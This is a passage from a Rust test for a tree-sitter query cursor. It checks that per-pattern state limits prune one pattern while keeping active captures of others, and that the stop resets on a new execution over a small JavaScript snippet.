    let mut cursor = tree_sitter::QueryCursor::new();
    for group_cap in [true, false] {
        let baseline = run(&mut cursor, false, group_cap);
        let stopped = run(&mut cursor, true, group_cap);
        assert_eq!(stopped.0[1], 1);
        assert_eq!(stopped.0[1], baseline.0[1]);
        if group_cap {
            // This candidate is already active when the wide array pattern
            // is pruned. Compaction must retain it and all of its captures.
            assert_eq!(stopped.0[2], 1);
            assert_eq!(stopped.0[2], baseline.0[2]);
            assert!(!cursor.pattern_exceeded(2));
        }
        assert!(
            stopped.1 * 10 < baseline.1,
            "limited pattern kept consuming the shared walk: {stopped:?} vs {baseline:?}"
        );
        assert!(cursor.pattern_exceeded(0));
        assert!(!cursor.pattern_exceeded(1));
    }
    // A new execution clears the per-pattern stop without mutating the query.
    let small = b"const table = ['a','b','c']; done();";
    let parsed = parsed_for_test("small.js", small);
    let tree = parsed.source_ast().unwrap().tree;
    cursor.set_match_limit(65536);
    cursor.set_max_states_per_group(16384);
    let mut matches = cursor.matches(&query, tree.root_node(), small.as_slice());
    let mut counts = [0; 3];
    while let Some(m) = matches.next() {
        counts[m.pattern_index] += 1;
    }
    drop(matches);
    assert_eq!(counts, [1, 1, 1]);
    assert!(!cursor.did_exceed_match_limit());
}
